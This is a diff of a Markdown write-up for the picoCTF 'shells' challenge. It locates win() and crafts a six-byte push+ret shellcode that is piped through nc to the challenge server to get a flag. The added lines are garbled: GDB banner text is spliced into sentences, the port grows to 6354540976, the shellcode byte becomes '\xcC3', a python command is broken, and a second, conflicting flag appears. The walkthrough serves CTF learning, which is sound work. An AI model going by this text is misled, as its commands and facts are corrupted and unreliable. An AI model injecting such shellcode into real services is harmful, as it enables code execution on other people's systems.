@@ -4,7 +4,7 @@
 **Points:** 70
 **Description:**
 
->How much can a couple bytes do? Use [shells](shells) [Source](shells.c). Connect on shell2017.picoctf.com:63545.
+>How much can a couple bytes do? Use [shells](shells) [Source](shells.c). Connect on shell2017.picoctf.com:6354540976.
 
 **Hint:**
 
@@ -21,7 +21,10 @@ You don't need a full shell (yet...), just enough to get the flag
 	So now lets try to HexDump the  `shells`  binary.
     
       ```
-    shells:     file format elf32-i386
+   Before we can craft a shellcode, we need to know the address of our `win()` function and loading up GDB is our best shot at it.
+
+    $ gdb shells:
+     file format elf32-i386
      Disassembly of section .init:
      08048378 <_init>:
       8048378:	53                   	push   %ebx
@@ -56,7 +59,13 @@ You don't need a full shell (yet...), just enough to get the flag
      --More--
     ```
     
-So it's x86 binary.
+So it'GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+    Copyright (C) 2014 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+    and "show warranty" for details.
+    This GDB was configured as "x86 binary.
 
 Now lets take a look on  `shells.c`  file.
     
@@ -99,41 +108,63 @@ Now lets take a look on  `shells.c`  file.
          return 0;
      }
 	```
-Just see their iss one  `win()`  function. Lets take a look on win() function in our HexDump. We can short out output using  `grep`  command.
+Just see their iss one  `win()`  function. Lets take a look on win() function in our HexDump. We can short out output us_64-linux-gnu".
+    Type "show configuration" for configuration details.
+    For bug reporting instructions, please see:
+    <http://www.gnu.org/software/gdb/bugs/>.
+    Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+    For help, type "help".
+    Type "apropos word" to search for commands related to "word"...
+    Reading symbols from shells...(no debugging symbols found)...done.
+    (gdb) info address wing
+  `grep`  command.
     
     objdump -d shells | grep win
-    08048540 <win>:
+     Symbol "win" is at 0x8048540 <win>:
     
-We got the address in Hex we used to write it in this way  `0x08048540`.
+We got the address in Hex we used to write it in this way in a file compiled without debugging.
+
+Simple, now we know `win()` is at `0x08048540`.
     
 Now we can use  [radare2](https://github.com/radare/radare2)  to generate our payload. Actually we need  `push+ret`  in order to make our payload.
     
-    $rasm2 -C "push 0x08048540"
+    $rasm2 -C " Let's craft a really simple `push+ret` shellcode.
+
+    0:  68 40 85 04 08          push   0x08048540"
     "\x68\x40\x85\x04\x08"
-    
+ 5:  c3   
     $rasm2 -C "ret"
     "\xc3"
     
 
-Here  `-C`  will give output in c format.Now combine the output of push+ret:`\x68\x40\x85\x04\x08\xc3`
+Here  `-C`  will give output in c format.Now combine the output of push+ret:               ret
+
+Put together, this gives us `\x68\x40\x85\x04\x08\xcC3`
 
 Now print this shellcode in one file name:  `spirit_shells`.
 
- python -c 'print "\x68\x40\x85\x04\x08\xc3"' > spirit_shells
+. Let's try it.
+
+    $ python -c '"print "('\x68\x40\x85\x04\x08\xc3"' > spirit_shells
 
 now just cat it out with the : shell2017.picoctf.com:63545
 
 $cat spirit_shells - | nc shell2017.picoctf.com 63545
- My mother told me to never accept things from strangers
- How bad could running a couple bytes be though?
- Give me 10 bytes:
+C3')" | nc shell2017.picoctf.com 40976
+    My mother told me to never accept things from strangers
+    How bad could running a couple bytes be though?
+    Give me 10 bytes:
  529efbd9e2dec5400206bedaf6a10e21
 
 So, i think we got the flag  `529efbd9e2dec5400206bedaf6a10e21`.
 
 Hope you liked it
 
-Thanks [Abhisek](https://github.com/vabhishek-me)
+Thanks [Abhisek](https://github.com/vabhishek-me)   cd875b6ffb5cdd3319532d52ceca71aa
+
+Therefore, the flag is `cd875b6ffb5cdd3319532d52ceca71aa`
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTI4MDA1MzU5MywtMTIzNDcwNDI4OF19
+eyJoaXN0b3J5IjpbLTQ5OTM4NjMyMSwxMjgwMDUzNTkzLC0xMj
+M0NzA0Mjg4XX0=
 -->
